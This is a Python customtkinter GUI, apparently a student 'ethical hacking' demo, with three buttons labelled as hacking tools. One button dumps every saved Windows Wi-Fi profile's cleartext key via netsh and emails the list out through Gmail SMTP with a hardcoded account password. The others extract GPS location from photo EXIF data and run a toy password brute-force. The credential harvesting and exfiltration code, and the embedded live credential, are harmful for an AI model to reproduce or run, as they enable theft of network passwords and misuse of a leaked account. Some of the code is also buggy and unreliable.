from random import randrange
import tkinter
import tkinter.messagebox
import customtkinter
from PIL import Image
import os
import pandas 
import matplotlib.pyplot as plt
import numpy as np
import subprocess
import re
import smtplib
from email.message import EmailMessage
from PIL.ExifTags import GPSTAGS, TAGS
import webbrowser
import string
from itertools import product
from time import time
from numpy import loadtxt
from CTkMessagebox import CTkMessagebox
customtkinter.set_appearance_mode("dark")


class App(customtkinter.CTk):
    width = 1050
    height = 650

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.title("CustomTkinter example_background_image.py")
        self.geometry(f"{self.width}x{self.height}")
        self.resizable(False, False)

        # load and create background image
        current_path = os.path.dirname(os.path.realpath(__file__))
        self.bg_image = customtkinter.CTkImage(Image.open(current_path + "/test_images/kali.jpg"),
                                               size=(self.width, self.height))
        self.bg_image_label = customtkinter.CTkLabel(self, image=self.bg_image)
        self.bg_image_label.grid(row=0, column=0)

        # create login frame
        self.login_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.login_frame.grid(row=0, column=0, sticky="ns")
        self.login_label = customtkinter.CTkLabel(self.login_frame, text="CustomTkinter\nLogin Page",
                                                  font=customtkinter.CTkFont(size=20, weight="bold"))
        self.login_label.grid(row=0, column=0, padx=30, pady=(150, 15))
        self.username_entry = customtkinter.CTkEntry(self.login_frame, width=200, placeholder_text="username")
        self.username_entry.grid(row=1, column=0, padx=30, pady=(15, 15))
        self.password_entry = customtkinter.CTkEntry(self.login_frame, width=200, show="*", placeholder_text="password")
        self.password_entry.grid(row=2, column=0, padx=30, pady=(0, 15))
        self.login_button = customtkinter.CTkButton(self.login_frame, text="Login", command=self.login_event, width=200)
        self.login_button.grid(row=3, column=0, padx=30, pady=(15, 15))

        # create main frame
        self.main_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.main_frame.grid_columnconfigure(1, weight=1)
        self.main_frame.grid_rowconfigure((0, 1, 2), weight=1)
        # self.main_label = customtkinter.CTkLabel(self.main_frame, text="CustomTkinter\nMain Page",
        #                                          font=customtkinter.CTkFont(size=20, weight="bold"))
        # self.main_label.grid(row=0, column=0, padx=30, pady=(30, 15))
        # self.back_button = customtkinter.CTkButton(self.main_frame, text="Back", command=self.back_event, width=200)
        # self.back_button.grid(row=1, column=0, padx=30, pady=(15, 15))
        
       
        ##hak1
        
        self.textbox1 = customtkinter.CTkTextbox(self.main_frame, width=550, height=160)
        self.textbox1.grid(row=0, column=0, padx=20, pady=10, sticky="nsew")
        self.sidebar_button_1 = customtkinter.CTkButton(self.main_frame, command=self.button_password, height=180, width=300, text='Password Hacking Start')
        self.sidebar_button_1.grid(row=0, column=1, padx=20, pady=10)                                     
        
        ##hak2
        
        self.textbox2 = customtkinter.CTkTextbox(self.main_frame, width=550,height=180)
        self.textbox2.grid(row=1, column=0, padx=20, pady=10, sticky="nsew")
        self.sidebar_button_2 = customtkinter.CTkButton(self.main_frame, command=self.button_location, height=180, width=300, text='Location Hacking Start')
        self.sidebar_button_2.grid(row=1, column=1, padx=20, pady=10)                                      
        
        ##hak3
              
        self.textbox3 = customtkinter.CTkTextbox(self.main_frame, width=550,height=180)
        self.textbox3.grid(row=2, column=0, padx=20, pady=10, sticky="nsew")
        self.sidebar_button_3 = customtkinter.CTkButton(self.main_frame, command=self.button_brutforce, height=180, width=300, text='Bruteforce Attack Start')
        self.sidebar_button_3.grid(row=2, column=1, padx=20, pady=10)
        with open("nazwa_pliku.txt", "r") as file:
            hak1 = file.read()
        with open("nazwa_pliku.txt", "r") as file:
            hak2 = file.read()
        with open("nazwa_pliku.txt", "r") as file:
            hak3 = file.read()   
        self.textbox1.insert("0.0",hak1)
        self.textbox2.insert("0.0",hak2)
        self.textbox3.insert("0.0",hak3)
    def login_event(self):
        print("Login pressed - username:", self.username_entry.get(), "password:", self.password_entry.get())

        self.login_frame.grid_forget()  # remove login frame
        self.main_frame.grid(row=0, column=0, sticky="nsew", padx=100)  # show main frame
        
    
    def button_brutforce(self):
            
            dialog = customtkinter.CTkInputDialog(text="Wpisz hasło składające się z 10 znaków", title="Bruteforce")
            
            start = time()
            self.bruteforce(dialog.get_input())
            end = time()
            x = ('Total time: %.2f seconds' % (end - start))
            print(x)
            CTkMessagebox(title ="Czas hakowania hasła",message="Hasło zostało schakowane",
                        icon="check", option_1="Thanks",)
    def back_event(self):
        self.main_frame.grid_forget()  # remove main frame
        self.login_frame.grid(row=0, column=0, sticky="ns")  # show login frame
    def get_password(self):
            command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

            profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

            wifi_list = list()

            if len(profile_names) != 0:
                for name in profile_names:
                    
                    wifi_profile = dict()
                    
                    profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
                    
                    if re.search("Security key           : Absent", profile_info):
                        continue
                    else:
                        
                        wifi_profile["ssid"] = name
                        
                        profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                        
                        password = re.search("Key Content            : (.*)\r", profile_info_pass)
                        
                        if password == None:
                            wifi_profile["password"] = None
                        else:
                            
                            wifi_profile["password"] = password[1]
                    
                        wifi_list.append(wifi_profile)



            email_message = ""
            for item in wifi_list:
                email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
            
            reciver = customtkinter.CTkInputDialog(text="Wpisz swój email", title="Wyślij hasła")
            dialog= str(reciver.get_input())
            email = EmailMessage()

            email["from"] = "ethical.hacking.by.diego@gmail.com"
            
            email["to"] = dialog

            email["subject"] = "WiFi SSIDs and Passwords"
            email.set_content(email_message)


            with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
                smtp.ehlo()
                
                smtp.starttls()
                
                smtp.login("ethical.hacking.by.diego@gmail.com", 'bwzktywobnzdwagt')
                
                smtp.send_message(email)

    def get_location(self):
        def create_google_maps_url(gps_coords):            
    
            dec_deg_lat = convert_decimal_degrees(float(gps_coords["lat"][0]),  float(gps_coords["lat"][1]), float(gps_coords["lat"][2]), gps_coords["lat_ref"])
                
            dec_deg_lon = convert_decimal_degrees(float(gps_coords["lon"][0]),  float(gps_coords["lon"][1]), float(gps_coords["lon"][2]), gps_coords["lon_ref"])
                
            return f"https://maps.google.com/?q={dec_deg_lat},{dec_deg_lon}"


            
        def convert_decimal_degrees(degree, minutes, seconds, direction):
            decimal_degrees = degree + minutes / 60 + seconds / 3600
                
            if direction == "S" or direction == "W":
                decimal_degrees *= -1
            return decimal_degrees
                    
            
        cwd = os.getcwd()
           
        os.chdir(os.path.join(cwd, "images"))
           
        files = os.listdir()

           
        if len(files) == 0:
            print("You don't have have files in the ./images folder.")
            exit()
            
        for file in files:
               
            try:
                    
                image = Image.open(file)
                print(f"_______________________________________________________________{file}_______________________________________________________________")
                   
                gps_coords = {}
                     
                if image._getexif() == None:
                    print(f"{file} contains no exif data.")
                    
                else:
                    for tag, value in image._getexif().items():
                            
                        tag_name = TAGS.get(tag)
                        if tag_name == "GPSInfo":
                            for key, val in value.items():
                                    
                                print(f"{GPSTAGS.get(key)} - {val}")
                                   
                                if GPSTAGS.get(key) == "GPSLatitude":
                                        gps_coords["lat"] = val
                                    
                                elif GPSTAGS.get(key) == "GPSLongitude":
                                        gps_coords["lon"] = val
                                    
                                elif GPSTAGS.get(key) == "GPSLatitudeRef":
                                        gps_coords["lat_ref"] = val
                                    
                                elif GPSTAGS.get(key) == "GPSLongitudeRef":
                                        gps_coords["lon_ref"] = val   
                            
                            
                         
                        if gps_coords:
                            print(create_google_maps_url(gps_coords))
                            webbrowser.open(create_google_maps_url(gps_coords))
                        
            except IOError:
                    print("File format not supported!")
 

       
    def product_loop(password, generator):
            for p in generator:
                if ''.join(p) == password:
                    print('\nPassword:', ''.join(p))
                    return ''.join(p)
            return False


    def bruteforce(self,password, max_nchar=8):
                """Password brute-force algorithm.

                Parameters
                ----------
                password : string
                    To-be-found password.
                max_nchar : int
                    Maximum number of characters of password.

                Return
                ------
                bruteforce_password : string
                    Brute-forced password
                """
                dlugosc = len(password)
                if dlugosc < 10:
                    CTkMessagebox(message="Hasło zostało schakowane",
                  icon="check", option_1="Thanks")
                    print('1) Comparing with most common passwords / first names')
                    common_pass = loadtxt('probable-v2-top12000.txt', dtype=str)
                    common_names = loadtxt('middle-names.txt', dtype=str)
                    cp = [c for c in common_pass if c == password]
                    cn = [c for c in common_names if c == password]
                    cnl = [c.lower() for c in common_names if c.lower() == password]

                    if len(cp) == 1:
                        print('\nPassword:', cp)
                        return cp
                    if len(cn) == 1:
                        print('\nPassword:', cn)
                        return cn
                    if len(cnl) == 1:
                        print('\nPassword:', cnl)
                        return cnl

                    print('2) Digits cartesian product')
                    for l in range(1, 9):
                        generator = product(string.digits, repeat=int(l))
                        print("\t..%d digit" % l)
                        p = self.product_loop(password, generator)
                        if p is not False:
                            return p

                    print('3) Digits + ASCII lowercase')
                    for l in range(1, max_nchar + 1):
                        print("\t..%d char" % l)
                        generator = product(string.digits + string.ascii_lowercase,
                                            repeat=int(l))
                        p = self.product_loop(password, generator)
                        if p is not False:
                            return p

                    print('4) Digits + ASCII lower / upper + punctuation')
                    # If it fails, we start brute-forcing the 'hard' way
                    # Same as possible_char = string.printable[:-5]
                    all_char = string.digits + string.ascii_letters + string.punctuation

                    for l in range(1, max_nchar + 1):
                        print("\t..%d char" % l)
                        generator = product(all_char, repeat=int(l))
                        p = self.product_loop(password, generator)
                        if p is not False:
                                return p
                    
                else:
                    CTkMessagebox(title="Error", message="Hasło dłuższe niż 9 cyfr", icon="cancel")
    def button_password(self):
            self.get_password()
            
    def button_location(self):
            self.get_location()
if __name__ == "__main__":
    app = App()
    app.mainloop()
